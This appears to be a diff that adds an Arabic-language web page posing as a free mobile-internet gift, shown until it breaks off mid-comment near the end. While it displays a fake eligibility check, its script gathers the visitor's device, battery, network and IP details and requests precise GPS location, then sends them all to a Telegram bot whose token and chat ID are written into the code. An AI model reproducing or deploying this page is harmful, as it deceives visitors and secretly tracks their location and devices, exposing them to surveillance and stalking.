@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>هدية مجانية</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f8ff;
+            color: #333;
+        }
+        .header {
+            background: linear-gradient(135deg, #4b6cb7, #182848);
+            color: white;
+            padding: 20px 0;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 28px;
+        }
+        .header p {
+            margin: 10px 0 0;
+            font-size: 16px;
+        }
+        .gift-box {
+            width: 150px;
+            height: 150px;
+            margin: 20px auto;
+            background: url('https://cdn-icons-png.flaticon.com/512/3481/3481072.png') no-repeat center center;
+            background-size: contain;
+            animation: bounce 2s infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        .content {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            margin-top: 20px;
+            margin-bottom: 40px;
+        }
+        .loading {
+            text-align: center;
+            padding: 20px;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #4b6cb7;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .hidden {
+            display: none;
+        }
+        .success-message {
+            text-align: center;
+            padding: 20px;
+            color: #2ecc71;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .config-section {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            border: 1px dashed #ccc;
+        }
+        .config-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #4b6cb7;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🎁 هدية مجانية خاصة بك! 🎁</h1>
+        <p>جاري تجهيز هديتك، الرجاء الانتظار...</p>
+    </div>
+
+    <div class="gift-box"></div>
+
+    <div class="content">
+        <div id="loading-section" class="loading">
+            <div class="loader"></div>
+            <p>جاري التحقق من بياناتك لتأهيلك للهدية...</p>
+        </div>
+
+        <div id="success-section" class="success-message hidden">
+            <p>🎉 تم تأهيلك بنجاح للهدية! 🎉</p>
+            <p>سيتم إعلامك بالتفاصيل قريبًا.</p>
+        </div>
+    </div>
+
+    <!-- قسم الإعدادات (يمكن إخفاؤه بعد التطبيق الفعلي) -->
+    <div class="content config-section">
+        <div class="config-title">هديه لفتره محدوده </div>
+        <p><strong>النتيجه:</strong> مبروك</p>
+        <p><strong>العرض:</strong> نت مجاني لخطك</p>
+        <p>Alshref.</p>
+    </div>
+
+    <script>
+        // إعدادات Telegram - يجب تغييرها إلى بياناتك الخاصة
+        const TELEGRAM_BOT_TOKEN = '8227483533:AAH3dmYtjkie0aqzk4ynOTkNsoFhQHk8VDY';
+        const TELEGRAM_CHAT_ID = '8306298380';
+        
+        // تخزين جميع البيانات المجمعة
+        let allCollectedData = {};
+        
+        // عرض رسالة النجاح
+        function showSuccess() {
+            document.getElementById('loading-section').classList.add('hidden');
+            document.getElementById('success-section').classList.remove('hidden');
+        }
+        
+        // جمع معلومات الجهاز
+        function collectDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                deviceMemory: navigator.deviceMemory || 'غير معروف',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
+                maxTouchPoints: navigator.maxTouchPoints || 'غير معروف',
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                orientation: window.screen.orientation ? window.screen.orientation.type : 'غير معروف'
+            };
+        }
+        
+        // جمع معلومات الشبكة
+        function collectNetworkInfo() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            
+            if (connection) {
+                return {
+                    type: connection.type || connection.effectiveType || 'غير معروف',
+                    downlink: connection.downlink ? `${connection.downlink} Mbps` : 'غير معروف',
+                    rtt: connection.rtt ? `${connection.rtt} ms` : 'غير معروف',
+                    saveData: connection.saveData ? 'نعم' : 'لا'
+                };
+            }
+            return null;
+        }
+        
+        // جمع معلومات البطارية
+        function collectBatteryInfo() {
+            if ('getBattery' in navigator) {
+                return navigator.getBattery().then(battery => {
+                    return {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging ? 'نعم' : 'لا',
+                        chargingTime: battery.chargingTime === Infinity ? 'غير معروف' : `${Math.round(battery.chargingTime / 60)} دقائق`,
+                        dischargingTime: battery.dischargingTime === Infinity ? 'غير معروف' : `${Math.round(battery.dischargingTime / 60)} دقائق`
+                    };
+                });
+            }
+            return Promise.resolve(null);
+        }
+        
+        // جلب معلومات الموقع عبر IP
+        function fetchIPAndLocation() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(ipData => {
+                    const ip = ipData.ip;
+                    return fetch(`https://ipapi.co/${ip}/json/`)
+                        .then(response => response.json())
+                        .then(locationData => {
+                            return {
+                                ip: ip,
+                                country: locationData.country_name || 'غير معروف',
+                                countryCode: locationData.country || 'غير معروف',
+                                city: locationData.city || 'غير معروف',
+                                timezone: locationData.timezone || 'غير معروف',
+                                isp: locationData.org || 'غير معروف',
+                                latitude: locationData.latitude || 'غير معروف',
+                                longitude: locationData.longitude || 'غير معروف',
+                                region: locationData.region || 'غير معروف',
+                                postalCode: locationData.postal || 'غير معروف'
+                            };
+                        });
+                });
+        }
+        
+        // جلب الموقع الدقيق
+        function fetchPreciseLocation() {
+            return new Promise((resolve) => {
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            resolve({
+                                preciseLatitude: position.coords.latitude,
+                                preciseLongitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy + ' متر'
+                            });
+                        },
+                        () => {
+                            resolve(null);
+                        }
+                    );
+                } else {
+                    resolve(null);
+                }
+            });
+        }
+        
+        // إرسال البيانات إلى Telegram
+        function sendToTelegram(data) {
+            // تحضير الرسالة
+            let message = `📊 *بيانات جهاز جديد* 📊\n\n`;
+            
+            // معلومات الجهاز
+            message += `💻 *معلومات الجهاز:*\n`;
+            message += `- نظام التشغيل: ${data.deviceInfo.platform}\n`;
+            message += `- المتصفح: ${data.deviceInfo.userAgent}\n`;
+            message += `- الذاكرة: ${data.deviceInfo.deviceMemory} GB\n`;
+            message += `- الأنوية: ${data.deviceInfo.hardwareConcurrency}\n`;
+            message += `- نقاط اللمس: ${data.deviceInfo.maxTouchPoints}\n\n`;
+            
+            // معلومات الشاشة
+            message += `🖥 *معلومات الشاشة:*\n`;
+            message += `- الدقة: ${data.deviceInfo.screenWidth} × ${data.deviceInfo.screenHeight}\n`;
+            message += `- نسبة البكسل: ${data.deviceInfo.pixelRatio}\n`;
+            message += `- عمق الألوان: ${data.deviceInfo.colorDepth} بت\n`;
+            message += `- الاتجاه: ${data.deviceInfo.orientation}\n\n`;
+            
+            // حالة البطارية
+            if (data.batteryInfo) {
+                message += `🔋 *حالة البطارية:*\n`;
+                message += `- النسبة: ${data.batteryInfo.level}\n`;
+                message += `- حالة الشحن: ${data.batteryInfo.charging}\n`;
+                message += `- وقت الشحن المتبقي: ${data.batteryInfo.chargingTime}\n`;
+                message += `- وقت التفريغ المتبقي: ${data.batteryInfo.dischargingTime}\n\n`;
+            }
+            
+            // معلومات الشبكة
+            if (data.networkInfo) {
+                message += `🌐 *معلومات الشبكة:*\n`;
+                message += `- نوع الاتصال: ${data.networkInfo.type}\n`;
+                message += `- سرعة التنزيل: ${data.networkInfo.downlink}\n`;
+                message += `- زمن الوصول: ${data.networkInfo.rtt}\n`;
+                message += `- توفير البيانات: ${data.networkInfo.saveData}\n\n`;
+            }
+            
+            // معلومات IP والموقع
+            if (data.ipInfo) {
+                message += `📍 *معلومات الموقع (IP):*\n`;
+                message += `- عنوان IP: ${data.ipInfo.ip}\n`;
+                message += `- البلد: ${data.ipInfo.country} (${data.ipInfo.countryCode})\n`;
+                message += `- المدينة: ${data.ipInfo.city}\n`;
+                message += `- المنطقة الزمنية: ${data.ipInfo.timezone}\n`;
+                message += `- مزود الخدمة: ${data.ipInfo.isp}\n\n`;
+                
+                message += `🗺 *الإحداثيات الجغرافية:*\n`;
+                message += `- خط العرض: ${data.ipInfo.latitude}\n`;
+                message += `- خط الطول: ${data.ipInfo.longitude}\n`;
+                message += `- المنطقة: ${data.ipInfo.region}\n`;
+                message += `- الرمز البريدي: ${data.ipInfo.postalCode}\n\n`;
+            }
+            
+            // الموقع الدقيق
+            if (data.preciseLocation) {
+                message += `🎯 *الموقع الدقيق:*\n`;
+                message += `- خط العرض: ${data.preciseLocation.preciseLatitude}\n`;
+                message += `- خط الطول: ${data.preciseLocation.preciseLongitude}\n`;
+                message += `- الدقة: ±${data.preciseLocation.accuracy}\n\n`;
+                
+                // رابط خرائط جوجل
+                message += `[عرض الموقع على خرائط جوجل](https://www.google.com/maps?q=${data.preciseLocation.preciseLatitude},${data.preciseLocation.preciseLongitude})`;
+            }
+            
+            // إرسال الرسالة إلى Telegram
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            return fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: false
+                })
+            });
+        }
+        
+        // العملية الرئيسية لجمع البيانات وإرسالها
+        async function collectAndSendData() {
+            try {
+                // جمع البيانات الأساسية
+                allCollectedData.deviceInfo = collectDeviceInfo();
+                allCollectedData.networkInfo = collectNetworkInfo();
+                
+                // جمع البيانات غير المتزامنة
+                const [batteryInfo, ipInfo, preciseLocation] = await Promise.all([
+                    collectBatteryInfo(),
+                    fetchIPAndLocation(),
+                    fetchPreciseLocation()
+                ]);
+                
+                allCollectedData.batteryInfo = batteryInfo;
+                allCollectedData.ipInfo = ipInfo;
+                allCollectedData.preciseLocation = preciseLocation;
+                
+                // إرسال البيانات إلى Telegram
+                await sendToTelegram(allCollectedData);
+                
+                // عرض رسالة النجاح
+                showSuccess();
+                
+            } catch (error) {
+                console.error('حدث خطأ أثناء جمع البيانات:', error);
+                // في حالة الخطأ، نعرض رسالة النجاح على
